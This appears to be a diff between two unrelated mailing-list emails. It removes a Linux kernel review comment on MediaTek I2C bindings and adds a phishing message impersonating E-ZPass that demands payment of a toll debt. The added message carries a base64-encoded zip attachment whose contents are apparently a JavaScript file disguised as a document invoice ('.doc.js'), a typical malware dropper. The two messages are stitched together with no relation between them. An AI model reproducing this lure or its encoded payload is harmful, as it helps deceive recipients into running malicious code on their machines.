@@ -1,80 +1,134 @@
-From: Sascha Hauer <s.hauer-bIcnvbaLZ9MEGnE8C9+IrQ@public.gmane.org>
-Subject: Re: [PATCH v5 1/3] dt-bindings: Add I2C bindings for mt65xx/mt81xx.
-Date: Mon, 23 Mar 2015 09:45:05 +0100
-Message-ID: <20150323084505.GH9742@pengutronix.de>
-References: <1426917922-61356-1-git-send-email-eddie.huang@mediatek.com>
- <1426917922-61356-2-git-send-email-eddie.huang@mediatek.com>
+From: "E-ZPass Support" <christian.driscoll-gWFmPyNizLFv8oa/uYrpnQ@public.gmane.org>
+Subject: MEDIA, Indebtedness for driving on toll road #000744480
+Date: Tue, 24 Mar 2015 23:14:45 -0500
+Message-ID: <6c2907a550e537c841dd56e2a27173b7@atechumphon.com>
+Reply-To: E-ZPass Support <christian.driscoll-gWFmPyNizLFv8oa/uYrpnQ@public.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-i2c-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <1426917922-61356-2-git-send-email-eddie.huang-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>
-Sender: linux-i2c-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Eddie Huang <eddie.huang-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>
-Cc: Wolfram Sang <wsa-z923LK4zBo2bacvFa/9K2g@public.gmane.org>, Matthias Brugger <matthias.bgg-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, Uwe =?iso-8859-15?Q?Kleine-K=F6nig?= <u.kleine-koenig-bIcnvbaLZ9MEGnE8C9+IrQ@public.gmane.org>, Mark Rutland <mark.rutland-5wv7dgnIgG8@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-i2c-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, David Box <david.e.box-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>, Lee Jones <lee.jones-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, Jean Delvare <jdelvare-l3A5Bk7waGM@public.gmane.org>, Xudong Chen <xudong.chen-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>, Boris BREZILLON <boris.brezillon-wi1+55ScJUtKEb57/3fJTNBPR1lH4CV8@public.gmane.org>, Arnd Bergmann <arnd-r2nGTMty4D4@public.gmane.org>, Liguo Zhang <liguo.zhang-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>, Wei Yan <sledge.yanwei-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>, Bjorn Andersson <bjorn.andersson-/MT0OVThwyLZJqsBc5GL+g@public.gmane.org>, Neelesh Gupta <neelegup-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>, devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Pawel Moll <pawel.moll-5wv7dgnIgG8@public.gmane.org>, Ian Campbell <ijc+devicetree-KcIKpvwj1kUDXYZnReoRVg@public.gmane.org>, Beniamino Galvani <b.galvani-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, Rob Herring <robh+dt-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, linux-mediatek-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org, linux-arm-
+Content-Type: multipart/mixed; boundary="b1_f2e634b45d202296138864907ac36e96"
+Content-Transfer-Encoding: 8bit
+Return-path: <linux-mediatek-bounces+glpam-linux-mediatek=m.gmane.org-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mediatek>,
+ <mailto:linux-mediatek-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=unsubscribe>
+List-Archive: <http://lists.infradead.org/pipermail/linux-mediatek/>
+List-Post: <mailto:linux-mediatek-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+List-Help: <mailto:linux-mediatek-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=help>
+List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mediatek>,
+ <mailto:linux-mediatek-request-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org?subject=subscribe>
+Sender: "Linux-mediatek" <linux-mediatek-bounces-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+Errors-To: linux-mediatek-bounces+glpam-linux-mediatek=m.gmane.org-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
+To: linux-mediatek-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
 List-Id: linux-mediatek@lists.infradead.org
 
-On Sat, Mar 21, 2015 at 02:05:20PM +0800, Eddie Huang wrote:
-> From: Xudong Chen <xudong.chen-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>
-> 
-> Add devicetree bindings for Mediatek Soc I2C driver.
-> 
-> Signed-off-by: Xudong Chen <xudong.chen-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>
-> Signed-off-by: Eddie Huang <eddie.huang-NuS5LvNUpcJWk0Htik3J/w@public.gmane.org>
-> ---
->  .../devicetree/bindings/i2c/i2c-mt6577.txt         | 41 ++++++++++++++++++++++
->  1 file changed, 41 insertions(+)
->  create mode 100644 Documentation/devicetree/bindings/i2c/i2c-mt6577.txt
-> 
-> diff --git a/Documentation/devicetree/bindings/i2c/i2c-mt6577.txt b/Documentation/devicetree/bindings/i2c/i2c-mt6577.txt
-> new file mode 100644
-> index 0000000..eff52c1
-> --- /dev/null
-> +++ b/Documentation/devicetree/bindings/i2c/i2c-mt6577.txt
-> @@ -0,0 +1,41 @@
-> +* Mediatek's I2C controller
-> +
-> +The Mediatek's I2C controller is used to interface with I2C devices.
-> +
-> +Required properties:
-> +  - compatible: value should be either of the following.
-> +      (a) "mediatek,mt6577-i2c", for i2c compatible with mt6577 i2c.
-> +      (b) "mediatek,mt6589-i2c", for i2c compatible with mt6589 i2c.
-> +      (c) "mediatek,mt8127-i2c", for i2c compatible with mt8127 i2c.
-> +      (d) "mediatek,mt8135-i2c", for i2c compatible with mt8135 i2c.
-> +      (e) "mediatek,mt8173-i2c", for i2c compatible with mt8173 i2c.
-> +  - reg: physical base address of the controller and dma base, length of memory
-> +    mapped region.
-> +  - interrupts: interrupt number to the cpu.
-> +  - clock-div: the fixed value for frequency divider of clock source in i2c
-> +    module. Each IC may be different.
-> +  - clocks: clock name from clock manager
-> +  - clock-names: Must include "main" and "dma", if enable have-pmic need include
-> +    "pmic" extra.
-> +
-> +Optional properties:
-> +  - clock-frequency: Frequency in Hz of the bus when transfer, the default value
-> +    is 100000.
-> +  - mediatek,have-pmic: platform can control i2c form special pmic side.
-> +    Only mt6589 and mt8135 support this feature.
-> +  - mediatek,use-push-pull: IO config use push-pull mode.
-> +
-> +Example:
-> +
-> +	i2c0: i2c@1100d000 {
-> +			compatible = "mediatek,mt6577-i2c";
-> +			reg = <0x1100d000 0x70>,
-> +			      <0x11000300 0x80>;
-> +			interrupts = <GIC_SPI 44 IRQ_TYPE_LEVEL_LOW>;
-> +			clock-frequency = <100000>;
+--b1_f2e634b45d202296138864907ac36e96
+Content-Type: text/plain; charset=us-ascii
 
-Since 100000 is the default you should probably pick another speed for
-this example or drop the property.
+Dear Media,
 
-Sascha
+You have a unpaid bill for using toll road.
+Please, do not forget to service your debt.
 
--- 
-Pengutronix e.K.                           |                             |
-Industrial Linux Solutions                 | http://www.pengutronix.de/  |
-Peiner Str. 6-8, 31137 Hildesheim, Germany | Phone: +49-5121-206917-0    |
-Amtsgericht Hildesheim, HRA 2686           | Fax:   +49-5121-206917-5555 |
+You can review the invoice in the attachment.
+
+Kind regards,
+Christian Driscoll,
+E-ZPass Manager.
+
+
+--b1_f2e634b45d202296138864907ac36e96
+Content-Type: application/zip; name="E-ZPass_Invoice_000744480.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=E-ZPass_Invoice_000744480.zip
+
+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
+ZG9jLmpzUEsFBgAAAAABAAEATgAAABYRAAAAAA==
+
+
+--b1_f2e634b45d202296138864907ac36e96
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Linux-mediatek mailing list
+Linux-mediatek-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
+http://lists.infradead.org/mailman/listinfo/linux-mediatek
+
+--b1_f2e634b45d202296138864907ac36e96--
